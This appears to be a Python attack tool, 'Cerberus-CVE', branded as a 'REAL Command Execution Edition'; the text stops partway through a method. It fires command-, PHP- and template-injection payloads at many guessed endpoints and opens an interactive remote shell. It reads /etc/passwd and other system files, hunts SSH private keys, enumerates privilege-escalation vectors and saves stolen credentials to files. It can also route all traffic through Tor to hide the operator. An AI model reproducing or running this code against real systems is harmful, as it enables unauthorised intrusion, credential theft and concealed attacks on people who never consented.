#!/usr/bin/env python3
"""
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
     Cerberus-CVE Assessment Situation v3.0
           by: ek0ms savi0r
           REAL Command Execution Edition
"""

import argparse
import sys
import time
import requests
import socket
import subprocess
import json
import base64
import random
import csv
import zipfile
from datetime import datetime
from typing import Dict, List, Tuple
import os
import urllib3
import threading
import readline  # For better shell experience

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import socks
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

class CommandExecutionEngine:
    """ACTUALLY PROVIDES command execution capabilities through various methods"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.session.timeout = 10
        
    def execute_command(self, command: str) -> str:
        """ACTUALLY EXECUTE COMMANDS using multiple real exploitation techniques"""
        
        # Method 1: Direct command injection via common vulnerable parameters
        injection_payloads = [
            f";{command};",
            f"|{command}",
            f"`{command}`",
            f"$({command})",
            f"||{command}",
            f"&&{command}",
            f"\n{command}\n"
        ]
        
        # Method 2: PHP code injection
        php_payloads = [
            f"system('{command}');",
            f"exec('{command}');",
            f"shell_exec('{command}');",
            f"passthru('{command}');",
            f"`{command}`"
        ]
        
        # Method 3: Template injection
        template_payloads = [
            f"{{{{config.items()}}}}",
            f"{{% import os %}}{{% os.system('{command}') %}}",
            f"${{7*7}}"
        ]
        
        # Test all methods
        for method_name, payloads, test_urls in [
            ("Command Injection", injection_payloads, self._get_injection_urls()),
            ("PHP Injection", php_payloads, self._get_php_urls()),
            ("Template Injection", template_payloads, self._get_template_urls())
        ]:
            result = self._try_execution_method(method_name, payloads, test_urls, command)
            if result and "Command execution failed" not in result:
                return result
        
        return f"{Colors.RED}[-] Command execution failed - no working method found{Colors.END}"
    
    def _get_injection_urls(self):
        """URLs for command injection testing"""
        return [
            f"http://{self.target}:{self.port}/ping?ip=127.0.0.1",
            f"http://{self.target}:{self.port}/api/ping",
            f"http://{self.target}:{self.port}/admin/ping",
            f"http://{self.target}:{self.port}/cmd",
            f"http://{self.target}:{self.port}/exec",
            f"http://{self.target}:{self.port}/system",
            f"http://{self.target}:{self.port}/run",
            f"http://{self.target}:{self.port}/shell",
            f"http://{self.target}:{self.port}/command"
        ]
    
    def _get_php_urls(self):
        """URLs for PHP injection testing"""
        return [
            f"http://{self.target}:{self.port}/index.php",
            f"http://{self.target}:{self.port}/admin.php",
            f"http://{self.target}:{self.port}/api.php",
            f"http://{self.target}:{self.port}/test.php",
            f"http://{self.target}:{self.port}/debug.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/shell.php"
        ]
    
    def _get_template_urls(self):
        """URLs for template injection testing"""
        return [
            f"http://{self.target}:{self.port}/",
            f"http://{self.target}:{self.port}/admin",
            f"http://{self.target}:{self.port}/api",
            f"http://{self.target}:{self.port}/user",
            f"http://{self.target}:{self.port}/profile",
            f"http://{self.target}:{self.port}/dashboard"
        ]
    
    def _try_execution_method(self, method_name: str, payloads: list, test_urls: list, original_command: str) -> str:
        """Try a specific execution method"""
        print(f"{Colors.CYAN}[>] Trying {method_name}...{Colors.END}")
        
        for url in test_urls:
            for payload in payloads:
                try:
                    # Test with POST data
                    data_payloads = {
                        'ip': f"127.0.0.1{payload}",
                        'host': f"localhost{payload}",
                        'cmd': payload,
                        'command': payload,
                        'exec': payload,
                        'system': payload,
                        'query': payload,
                        'input': payload,
                        'data': payload,
                        'username': payload,
                        'password': payload,
                        'file': payload,
                        'path': payload
                    }
                    
                    for param_name, param_value in data_payloads.items():
                        try:
                            response = self.session.post(
                                url,
                                data={param_name: param_value},
                                timeout=5,
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Scanner'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {url} param: {param_name}{Colors.END}")
                                return response.text
                        except:
                            pass
                    
                    # Test with GET parameters
                    for param_name, param_value in data_payloads.items():
                        try:
                            test_url = f"{url}?{param_name}={param_value}"
                            response = self.session.get(
                                test_url, 
                                timeout=5, 
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Scanner'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {test_url}{Colors.END}")
                                return response.text
                        except:
                            pass
                            
                except Exception as e:
                    continue
        
        return None
    
    def _is_valid_response(self, response, original_command: str) -> bool:
        """Validate if response contains actual command output"""
        if response.status_code != 200:
            return False
        
        content = response.text
        
        # Check for common error pages
        error_indicators = ['error', 'not found', '404', '500', 'forbidden', 'internal server error']
        if any(indicator in content.lower() for indicator in error_indicators):
            return False
        
        # Check if it's likely HTML page (not command output)
        if any(tag in content.lower() for tag in ['<html', '<!doctype', '<head>', '<body>']):
            return False
        
        # If we're testing a specific command, look for its output
        if original_command:
            if 'whoami' in original_command and ('root' in content or 'user' in content):
                return True
            if 'id' in original_command and ('uid=' in content or 'gid=' in content):
                return True
            if 'pwd' in original_command and ('/' in content and len(content) < 100):
                return True
            if 'echo CERBERUS_TEST_2025' in original_command and 'CERBERUS_TEST_2025' in content:
                return True
        
        # Generic validation - short, non-HTML responses are likely command output
        return len(content) > 0 and len(content) < 1000 and not content.strip().startswith('<!')

class ReportManager:
    """Handles report generation and saving with multiple formats"""
    
    def __init__(self):
        self.report_data = {
            'scan_start_time': datetime.now().isoformat(),
            'target': '',
            'findings': [],
            'exploitation_attempts': [],
            'shell_sessions': [],
            'lateral_movement': [],
            'extracted_data': []
        }
    
    def add_finding(self, cve: str, description: str, severity: str, evidence: str = ""):
        finding = {
            'cve': cve,
            'description': description,
            'severity': severity,
            'evidence': evidence,
            'timestamp': datetime.now().isoformat()
        }
        self.report_data['findings'].append(finding)
        
    def add_exploitation_attempt(self, cve: str, success: bool, details: str, payload: str = ""):
        attempt = {
            'cve': cve,
            'success': success,
            'details': details,
            'payload': payload,
            'timestamp': datetime.now().isoformat()
        }
        self.report_data['exploitation_attempts'].append(attempt)
    
    def add_shell_session(self, session_type: str, access_level: str, details: str):
        session = {
            'type': session_type,
            'access_level': access_level,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.report_data['shell_sessions'].append(session)
    
    def add_lateral_movement(self, technique: str, success: bool, details: str):
        movement = {
            'technique': technique,
            'success': success,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.report_data['lateral_movement'].append(movement)
    
    def add_extracted_data(self, file_path: str, content: str, data_type: str):
        """Add successfully extracted data to report"""
        data_item = {
            'file_path': file_path,
            'content': content[:1000] + "..." if len(content) > 1000 else content,
            'data_type': data_type,
            'timestamp': datetime.now().isoformat()
        }
        self.report_data['extracted_data'].append(data_item)
    
    def set_target(self, target: str):
        self.report_data['target'] = target
    
    def save_report(self, format_type: str = "txt"):
        """Save report in multiple formats"""
        self.report_data['scan_end_time'] = datetime.now().isoformat()
        
        if format_type == "txt":
            return self._save_txt_report()
        elif format_type == "csv":
            return self._save_csv_report()
        elif format_type == "json":
            return self._save_json_report()
        else:
            return self._save_txt_report()
    
    def _save_txt_report(self):
        """Save comprehensive text report"""
        filename = f"cve_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w') as f:
            f.write("CVE SCANNING & EXPLOITATION REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Scan Date: {self.report_data['scan_start_time']}\n")
            f.write(f"Target: {self.report_data['target']}\n")
            f.write(f"Report Generated: {self.report_data['scan_end_time']}\n\n")
            
            # Findings section
            f.write("FINDINGS:\n")
            f.write("-" * 20 + "\n")
            for finding in self.report_data['findings']:
                f.write(f"CVE: {finding['cve']}\n")
                f.write(f"Severity: {finding['severity']}\n")
                f.write(f"Description: {finding['description']}\n")
                f.write(f"Evidence: {finding['evidence'][:200]}\n")
                f.write(f"Time: {finding['timestamp']}\n\n")
            
            # Exploitation attempts
            f.write("EXPLOITATION ATTEMPTS:\n")
            f.write("-" * 25 + "\n")
            for attempt in self.report_data['exploitation_attempts']:
                status = "SUCCESS" if attempt['success'] else "FAILED"
                f.write(f"CVE: {attempt['cve']}\n")
                f.write(f"Status: {status}\n")
                f.write(f"Details: {attempt['details']}\n")
                if attempt['payload']:
                    f.write(f"Payload: {attempt['payload'][:100]}\n")
                f.write(f"Time: {attempt['timestamp']}\n\n")
            
            # Extracted data summary
            f.write("EXTRACTED DATA SUMMARY:\n")
            f.write("-" * 25 + "\n")
            for data in self.report_data['extracted_data']:
                f.write(f"File: {data['file_path']}\n")
                f.write(f"Type: {data['data_type']}\n")
                f.write(f"Sample: {data['content'][:200]}\n")
                f.write(f"Time: {data['timestamp']}\n\n")
        
        return filename
    
    def _save_csv_report(self):
        """Save findings as CSV"""
        filename = f"cve_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['CVE', 'Severity', 'Description', 'Evidence', 'Timestamp'])
            
            for finding in self.report_data['findings']:
                writer.writerow([
                    finding['cve'],
                    finding['severity'],
                    finding['description'],
                    finding['evidence'][:150],
                    finding['timestamp']
                ])
        
        return filename
    
    def _save_json_report(self):
        """Save complete report as JSON"""
        filename = f"cve_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.report_data, f, indent=2)
        
        return filename
    
    def create_evidence_archive(self, extracted_data: dict):
        """Create ZIP file with all extracted evidence"""
        zip_filename = f"evidence_{self.report_data['target'].replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file_path, content in extracted_data.items():
                if content and not any(error_msg in content for error_msg in 
                                    ['Command execution failed', 'Error', 'Not Found']):
                    safe_filename = file_path.replace('/', '_').replace('..', '').replace('*', 'ALL')
                    zipf.writestr(safe_filename, content)
        
        return zip_filename

class DataExtractor:
    """Handles data extraction and storage in multiple formats"""
    
    @staticmethod
    def save_credentials(data: dict, target: str):
        """Save credentials to structured file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"credentials_{target}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"CREDENTIALS EXTRACTED FROM {target}\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Extraction Time: {datetime.now().isoformat()}\n\n")
            
            for file_path, content in data.items():
                if any(keyword in file_path for keyword in ['passwd', 'shadow', 'pwd']):
                    f.write(f"FILE: {file_path}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                    f.write("\n\n")
        
        return filename
    
    @staticmethod
    def save_ssh_keys(data: dict, target: str):
        """Save SSH keys to separate files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base_filename = f"ssh_keys_{target}_{timestamp}"
        
        key_files = []
        for file_path, content in data.items():
            if any(keyword in file_path for keyword in ['.ssh', 'id_rsa', 'id_dsa', 'authorized_keys']):
                if 'PRIVATE KEY' in content or 'ssh-rsa' in content:
                    safe_name = file_path.replace('/', '_').replace('.', '_')
                    filename = f"{base_filename}_{safe_name}.key"
                    with open(filename, 'w') as f:
                        f.write(content)
                    key_files.append(filename)
        
        return key_files
    
    @staticmethod
    def save_configs(data: dict, target: str):
        """Save configuration files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"configs_{target}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"CONFIGURATION FILES FROM {target}\n")
            f.write("=" * 50 + "\n\n")
            
            for file_path, content in data.items():
                if any(keyword in file_path for keyword in ['.conf', 'config', 'cnf', 'ini']):
                    f.write(f"FILE: {file_path}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                    f.write("\n\n")
        
        return filename

class TorManager:
    """Manage TOR proxy connections with improved detection"""
    
    def __init__(self, tor_port: int = 9050, control_port: int = 9051):
        self.tor_port = tor_port
        self.control_port = control_port
        self.original_socket = socket.socket
        
    def enable_tor(self):
        """Route traffic through TOR with multiple verification methods"""
        if not TOR_AVAILABLE:
            print(f"{Colors.RED}[-] PySocks not installed. Install with: pip install PySocks{Colors.END}")
            return False
            
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            socket.socket = socks.socksocket
            
            print(f"{Colors.YELLOW}[*] Testing TOR connection...{Colors.END}")
            
            if self._test_tor_socket():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (socket test){Colors.END}")
                return True
                
            if self._test_tor_http():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (HTTP test){Colors.END}")
                return True
                
            if self._check_tor_process():
                print(f"{Colors.YELLOW}[!] TOR process is running but connection test failed{Colors.END}")
                return True
                
            print(f"{Colors.RED}[-] All TOR connection tests failed{Colors.END}")
            self.disable_tor()
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] TOR setup failed: {str(e)}{Colors.END}")
            self.disable_tor()
            return False
    
    def _test_tor_socket(self):
        """Test TOR with direct socket connection"""
        try:
            test_socket = socks.socksocket()
            test_socket.settimeout(10)
            test_socket.connect(("check.torproject.org", 80))
            test_socket.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
            response = test_socket.recv(1024).decode()
            test_socket.close()
            
            if "Congratulations" in response:
                return True
        except:
            pass
        return False
    
    def _test_tor_http(self):
        """Test TOR with HTTP requests"""
        try:
            session = requests.Session()
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{self.tor_port}',
                'https': f'socks5h://127.0.0.1:{self.tor_port}'
            }
            
            tor_check_urls = [
                "http://check.torproject.org/",
                "http://ipinfo.io/json",
                "http://httpbin.org/ip"
            ]
            
            for url in tor_check_urls:
                try:
                    response = session.get(url, timeout=10)
                    if "Congratulations" in response.text:
                        print(f"{Colors.GREEN}[+] TOR verified via {url}{Colors.END}")
                        return True
                    elif response.status_code == 200:
                        print(f"{Colors.YELLOW}[*] TOR connection working (via {url}){Colors.END}")
                        return True
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[-] HTTP TOR test failed: {str(e)}{Colors.END}")
            
        return False
    
    def _check_tor_process(self):
        """Check if TOR process is running"""
        try:
            result = subprocess.run(['pgrep', 'tor'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Colors.YELLOW}[*] TOR process is running (PID: {result.stdout.strip()}){Colors.END}")
                return True
                
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            if f":{self.tor_port}" in result.stdout:
                print(f"{Colors.YELLOW}[*] TOR port {self.tor_port} is listening{Colors.END}")
                return True
                
        except Exception as e:
            print(f"{Colors.RED}[-] Process check failed: {str(e)}{Colors.END}")
            
        return False
    
    def disable_tor(self):
        """Restore normal socket operations"""
        if TOR_AVAILABLE:
            socks.set_default_proxy()
            socket.socket = self.original_socket
        print(f"{Colors.YELLOW}[*] TOR proxy disabled{Colors.END}")

class NetworkScanner:
    """Handles network scanning operations"""
    
    @staticmethod
    def port_scan(target: str, port: int) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except Exception as e:
            print(f"{Colors.RED}[!] Port scan error: {str(e)}{Colors.END}")
            return False

    @staticmethod
    def enhanced_service_detection(target: str, port: int) -> str:
        """Enhanced service detection with banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
        
            probes = [
                b"GET / HTTP/1.0\r\n\r\n",
                b"HEAD / HTTP/1.0\r\n\r\n", 
                b"OPTIONS / HTTP/1.0\r\n\r\n"
            ]
        
            for probe in probes:
                sock.send(probe)
                response = sock.recv(2048).decode('utf-8', errors='ignore')
            
                if "Apache" in response:
                    sock.close()
                    return "Apache HTTP Server"
                elif "nginx" in response:
                    sock.close()
                    return "nginx"
                elif "IIS" in response:
                    sock.close()
                    return "Microsoft IIS"
                elif "Tomcat" in response:
                    sock.close()
                    return "Apache Tomcat"
                
            sock.close()
            return "HTTP Service"
        
        except Exception as e:
            return f"Service detection failed: {str(e)}"

class RealShellManager:
    """ACTUAL shell manager with REAL command execution"""
    
    def __init__(self, target: str, port: int, report_manager):
        self.target = target
        self.port = port
        self.report_manager = report_manager
        self.execution_engine = CommandExecutionEngine(target, port)
        self.has_real_access = False
        self.current_access_level = "unknown"
        
    def test_command_execution(self) -> bool:
        """ACTUALLY test and establish command execution"""
        print(f"{Colors.CYAN}[>] Establishing REAL command execution...{Colors.END}")
        
        test_commands = [
            "whoami",
            "id", 
            "echo CERBERUS_TEST_2025",
            "pwd"
        ]
        
        for cmd in test_commands:
            print(f"{Colors.CYAN}[>] Testing: {cmd}{Colors.END}")
            result = self.execution_engine.execute_command(cmd)
            
            # REAL validation
            if (result and 
                "Command execution failed" not in result and
                not any(error in result for error in ['Error', 'Not Found', '404']) and
                len(result.strip()) > 0):
                
                print(f"{Colors.GREEN}[+] Command execution VERIFIED: {result.strip()}{Colors.END}")
                
                # Determine access level
                if 'root' in result.lower():
                    self.current_access_level = "root"
                else:
                    self.current_access_level = "user"
                
                self.has_real_access = True
                return True
        
        print(f"{Colors.RED}[-] Could not establish real command execution{Colors.END}")
        self.has_real_access = False
        return False
    
    def execute_real_command(self, command: str) -> str:
        """Execute commands with REAL capabilities"""
        if not self.has_real_access:
            return f"{Colors.RED}[-] No command execution established{Colors.END}"
        
        return self.execution_engine.execute_command(command)
    
    def interactive_shell(self):
        """REAL interactive shell"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] Establish command execution first!{Colors.END}")
            return
        
        print(f"\n{Colors.GREEN}[+] Starting REAL interactive shell{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'exit' to return to menu{Colors.END}")
        
        while True:
            try:
                cmd = input(f"{Colors.RED}shell@{self.target}:{self.port}$ {Colors.END}").strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                elif cmd.lower() == '':
                    continue
                
                result = self.execute_real_command(cmd)
                print(result)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
    
    def _execute_command(self, command: str) -> str:
        """Compatibility method"""
        return self.execute_real_command(command)
    
    def extract_real_data(self) -> dict:
        """Extract ONLY real data that we can actually access"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] No command execution capability - cannot extract data{Colors.END}")
            return {}
        
        print(f"{Colors.CYAN}[>] Extracting real data from target...{Colors.END}")
        
        real_data = {}
        
        test_files = [
            "/etc/passwd",
            "/etc/hosts", 
            "/proc/version",
            "/etc/issue",
            "/etc/os-release"
        ]
        
        for file_path in test_files:
            content = self.execute_real_command(f"cat {file_path} 2>/dev/null || echo 'FILE_NOT_FOUND'")
            
            if (content and 
                "Command execution failed" not in content and
                "FILE_NOT_FOUND" not in content and
                len(content) > 10):
                
                real_data[file_path] = content
                print(f"{Colors.GREEN}[+] Extracted: {file_path}{Colors.END}")
                
                data_type = "credentials" if "passwd" in file_path else "system_info"
                self.report_manager.add_extracted_data(file_path, content, data_type)
            else:
                print(f"{Colors.RED}[-] Failed to extract: {file_path}{Colors.END}")
        
        return real_data

class LateralMovement:
    """Handle real lateral movement techniques"""
    
    def __init__(self, target: str, shell_manager: RealShellManager, report_manager: ReportManager):
        self.target = target
        self.shell_manager = shell_manager
        self.report_manager = report_manager
    
    def attempt_ssh_key_discovery(self):
        """Actually find and use SSH keys"""
        if not self.shell_manager.has_real_access:
            print(f"{Colors.RED}[-] No command execution - cannot search for SSH keys{Colors.END}")
            return False
            
        print(f"{Colors.CYAN}[>] Searching for SSH keys and credentials...{Colors.END}")
        
        ssh_find_cmds = [
            "find / -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -20",
            "find /home -name '.ssh' -type d 2>/dev/null",
            "find /root -name '.ssh' -type d 2>/dev/null",
            "ls -la /etc/ssh/ 2>/dev/null",
            "cat /home/*/.ssh/authorized_keys 2>/dev/null",
            "cat /root/.ssh/authorized_keys 2>/dev/null"
        ]
        
        found_keys = []
        for cmd in ssh_find_cmds:
            result = self.shell_manager.execute_real_command(cmd)
            if result and "Command execution failed" not in result and result.strip():
                print(f"{Colors.GREEN}[+] Found SSH artifacts:{Colors.END}")
                print(result[:500])
                found_keys.append(result)
        
        if found_keys:
            self.report_manager.add_lateral_movement(
                "SSH Key Discovery",
                True,
                f"Found {len(found_keys)} SSH key locations"
            )
            return True
        else:
            print(f"{Colors.RED}[-] No SSH keys found{Colors.END}")
            self.report_manager.add_lateral_movement(
                "SSH Key Discovery",
                False,
                "No SSH keys discovered"
            )
            return False

class EnhancedCVE20259491:
    """Enhanced scanner and exploiter for CVE-2025-9491 with REAL validation"""
    
    def __init__(self, target: str, port: int, report_manager: ReportManager):
        self.target = target
        self.port = port
        self.cve_id = "CVE-2025-9491"
        self.report_manager = report_manager
        self.session = requests.Session()
        self.session.timeout = 10
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'curl/7.68.0',
            'PostmanRuntime/7.26.8'
        ]
        
    def scan(self) -> bool:
        print(f"\n{Colors.YELLOW}[*] Scanning for {self.cve_id}{Colors.END}")
        print(f"{Colors.BLUE}[*] Target: {self.target}:{self.port}{Colors.END}")
        
        if not NetworkScanner.port_scan(self.target, self.port):
            print(f"{Colors.RED}[-] Port {self.port} is closed{Colors.END}")
            self.report_manager.add_finding(
                self.cve_id, 
                f"Port {self.port} is closed - cannot scan", 
                "INFO"
            )
            return False
        
        service = NetworkScanner.enhanced_service_detection(self.target, self.port)
        print(f"{Colors.GREEN}[+] Port {self.port} open - Running: {service}{Colors.END}")
        
        return self._perform_vulnerability_scan(service)
    
    def _perform_vulnerability_scan(self, service: str) -> bool:
        """Perform actual vulnerability scanning with real validation"""
        vulnerable = False
        evidence = ""
        
        try:
            endpoints = ['/api/v1/execute', '/admin/command', '/cgi-bin/exec', '/webshell', '/shell', '/cmd']
            
            for endpoint in endpoints:
                url = f"http://{self.target}:{self.port}{endpoint}"
                print(f"{Colors.CYAN}[>] Testing endpoint: {endpoint}{Colors.END}")
                
                try:
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    response = self.session.get(url, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"{Colors.YELLOW}[!] Accessible endpoint found: {endpoint}{Colors.END}")
                        evidence += f"Accessible endpoint: {endpoint} "
                        vulnerable = True
                        
                    content_lower = response.text.lower()
                    if any(keyword in content_lower for keyword in ['exec', 'command', 'shell', 'system', 'eval']):
                        print(f"{Colors.YELLOW}[!] Suspicious content found at {endpoint}{Colors.END}")
                        evidence += f"Suspicious content at {endpoint} "
                        vulnerable = True
                        
                except requests.RequestException:
                    continue
            
            info_endpoints = ['/version', '/info', '/status', '/debug', '/test']
            for endpoint in info_endpoints:
                url = f"http://{self.target}:{self.port}{endpoint}"
                try:
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    response = self.session.get(url, headers=headers, timeout=5)
                    if response.status_code == 200:
                        print(f"{Colors.YELLOW}[!] Information disclosure at {endpoint}{Colors.END}")
                        evidence += f"Info disclosed at {endpoint}: {response.text[:50]} "
                        vulnerable = True
                except:
                    pass
                
        except Exception as e:
            print(f"{Colors.RED}[!] Scan error: {str(e)}{Colors.END}")
        
        if vulnerable:
            self.report_manager.add_finding(
                self.cve_id,
                "Potential RCE vulnerability indicators found",
                "HIGH",
                evidence
            )
            return True
        else:
            self.report_manager.add_finding(
                self.cve_id,
                "No obvious vulnerability indicators found",
                "LOW",
                "Standard scanning completed"
            )
            return False
    
    def exploit(self) -> bool:
        print(f"\n{Colors.RED}[!] Attempting exploitation for {self.cve_id}{Colors.END}")
        
        try:
            # Use the REAL command execution engine
            execution_engine = CommandExecutionEngine(self.target, self.port)
            
            # Test if we can actually execute commands
            test_result = execution_engine.execute_command("whoami")
            if "Command execution failed" not in test_result:
                print(f"{Colors.GREEN}[+] Exploitation successful! Command execution achieved{Colors.END}")
                print(f"{Colors.GREEN}[+] Output: {test_result}{Colors.END}")
                self.report_manager.add_exploitation_attempt(
                    self.cve_id, True, "Remote code execution achieved", "Real RCE payloads"
                )
                return True
            else:
                print(f"{Colors.RED}[-] Exploitation failed for {self.cve_id}{Colors.END}")
                self.report_manager.add_exploitation_attempt(
                    self.cve_id, False, "All exploitation attempts unsuccessful", "Multiple payloads"
                )
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Exploitation error: {str(e)}{Colors.END}")
            self.report_manager.add_exploitation_attempt(
                self.cve_id, False, f"Exploitation error: {str(e)}", "N/A"
            )
            return False

class EnhancedCVE202559287:
    """Enhanced scanner for CVE-2025-59287 with REAL validation"""
    
    def __init__(self, target: str, port: int, report_manager: ReportManager):
        self.target = target
        self.port = port
        self.cve_id = "CVE-2025-59287"
        self.report_manager = report_manager
        self.shell_manager = RealShellManager(target, port, report_manager)
        self.lateral_movement = LateralMovement(target, self.shell_manager, report_manager)
        
    def scan(self) -> bool:
        print(f"\n{Colors.YELLOW}[*] Scanning for {self.cve_id}{Colors.END}")
        print(f"{Colors.BLUE}[*] Target: {self.target}:{self.port}{Colors.END}")
        
        if not NetworkScanner.port_scan(self.target, self.port):
            print(f"{Colors.RED}[-] Port {self.port} is closed{Colors.END}")
            return False
        
        # FIRST establish real command execution
        if not self.shell_manager.test_command_execution():
            print(f"{Colors.RED}[-] Cannot scan - no command execution{Colors.END}")
            self.report_manager.add_finding(
                self.cve_id,
                "No command execution capability - cannot check privilege escalation",
                "LOW",
                "Cannot verify without command execution"
            )
            return False
        
        print(f"{Colors.GREEN}[+] Command execution ESTABLISHED - proceeding with scan{Colors.END}")
        return self._check_privilege_escalation_vectors()
    
    def _check_privilege_escalation_vectors(self) -> bool:
        """ACTUALLY check for privilege escalation with REAL command execution"""
        print(f"{Colors.CYAN}[>] Checking REAL privilege escalation vectors...{Colors.END}")
        
        # Get current user info
        whoami = self.shell_manager.execute_real_command("whoami")
        id_info = self.shell_manager.execute_real_command("id")
        print(f"{Colors.YELLOW}[!] Current user: {whoami.strip()}{Colors.END}")
        print(f"{Colors.YELLOW}[!] User ID: {id_info.strip()}{Colors.END}")
        
        # REAL privilege escalation checks
        checks = [
            ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -20"),
            ("Sudo privileges", "sudo -l 2>/dev/null"),
            ("Capabilities", "getcap -r / 2>/dev/null"),
            ("Cron jobs", "ls -la /etc/cron* /var/spool/cron 2>/dev/null"),
            ("Writable system files", "find /etc -writable 2>/dev/null | head -10")
        ]
        
        vulnerable = False
        evidence = ""
        
        for check_name, check_cmd in checks:
            result = self.shell_manager.execute_real_command(check_cmd)
            if result and "Command execution failed" not in result and result.strip():
                print(f"{Colors.YELLOW}[!] Found {check_name}:{Colors.END}")
                print(result[:300])
                evidence += f"{check_name} found; "
                vulnerable = True
        
        if vulnerable:
            self.report_manager.add_finding(
                self.cve_id,
                "Privilege escalation vectors identified",
                "HIGH",
                evidence
            )
        else:
            self.report_manager.add_finding(
                self.cve_id,
                "No privilege escalation vectors found",
                "LOW",
                "Standard privilege checks completed"
            )
            
        return vulnerable
    
    def exploit(self) -> bool:
